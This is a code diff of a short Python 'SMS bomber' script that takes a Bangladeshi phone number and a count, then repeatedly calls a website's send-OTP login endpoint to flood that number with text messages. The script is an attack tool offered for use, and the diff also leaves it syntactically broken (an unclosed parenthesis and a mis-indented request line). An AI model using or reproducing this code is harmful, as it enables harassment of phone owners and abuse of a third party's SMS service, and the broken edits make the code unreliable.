@@ -1,4 +1,4 @@
-#import requests
+import requests
 #GET 
 
 print(""""
@@ -17,7 +17,7 @@ print(""""
 """'')
 
 
-number=str(input("Enter The Number:"))
+number=str(input("Enter The Number(without:+880):")
 
 amount=int(input("Enter The Amount:"))
 
@@ -25,5 +25,5 @@ api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operato
 
 for i in range(amount):
 	
-	requests.get(api)
-	print(str(i+1)+"SMS SENT")
+requests.get(api)
+	print(str(i+1)+"SMS SENT✅")
